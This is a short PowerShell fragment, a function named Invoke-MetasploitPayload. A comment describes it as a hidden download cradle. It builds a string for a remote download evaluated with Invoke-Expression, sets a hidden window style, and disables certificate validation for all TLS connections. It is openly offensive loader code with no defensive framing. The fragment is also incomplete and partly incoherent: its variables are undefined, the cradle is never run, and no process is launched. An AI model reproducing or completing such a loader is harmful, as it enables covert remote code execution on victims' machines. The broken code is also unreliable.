# Hidden cradle shape: staged download evaluated with IEX, launched
# without a window and blind to certificate errors.
function Invoke-MetasploitPayload {
  $c = '$client.downloadstring($url); Invoke-Expression $c'
  $pi = New-Object System.Diagnostics.ProcessStartInfo
  $pi.WindowStyle = 'Hidden'
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
}
